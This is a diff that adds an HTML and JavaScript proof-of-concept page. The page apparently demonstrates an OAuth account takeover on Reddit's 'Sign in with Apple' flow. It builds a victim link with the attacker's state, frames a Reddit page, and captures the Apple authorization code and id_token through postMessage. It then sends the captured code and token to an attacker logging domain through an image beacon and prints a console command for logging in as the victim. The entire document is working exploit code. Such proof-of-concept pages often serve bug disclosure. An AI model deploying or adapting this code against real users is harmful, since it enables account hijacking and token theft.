@@ -1,0 +1,76 @@
+<html>
+<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
+<body>
+<div id="start">
+Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
+<input id="state">
+<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
+</div>
+
+
+<div id="fr"></div>
+
+<script>
+var inj, monitor;
+function extractstate(st) {
+    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
+}
+function startmonitor(st) {
+    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
+    monitor = setInterval(function() {
+        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
+            if (e.length) {
+                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
+                var p = document.createElement('pre');
+                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
+                document.getElementById('fr').appendChild(p)
+                clearInterval(monitor);
+            }
+        });
+    }, 2000);
+}
+function launch(st, showonly) {
+    if (showonly) {
+        history.pushState('/','/',location.pathname + '?state=' + st)
+        document.getElementById('fr').innerText = 'Send this link to victim: ';
+        var p = document.createElement('pre');
+        p.innerText = location.href;
+        document.getElementById('fr').appendChild(p);
+        startmonitor(st);
+    } else {
+        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
+    }
+    document.getElementById('start').innerHTML = '';
+}
+if (location.search && location.search.split('state=')[1].split('&')[0]) {
+    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
+}
+window.onmessage = function(e) {
+    if (e.data === 'stopinject') {
+        console.log('frame injected');
+        clearInterval(inj)
+    }
+    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
+        payload = JSON.parse(e.data);
+        data = payload.hash.replace('state=state=', 'state=');
+        var state = data.split('state=')[1].split('&')[0];
+        var code = data.split('code=')[1].split('&')[0];
+        var id_token = data.split('id_token=')[1].split('&')[0];
+        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});
+
+        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
+        var p = document.createElement('pre');
+        p.innerText = payload;
+        document.getElementById('fr').appendChild(p);
+
+        var s = document.createElement('img');
+        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
+        document.body.appendChild(s);   
+    }
+}
+
+</script>
+
+
+</body>
+</html>
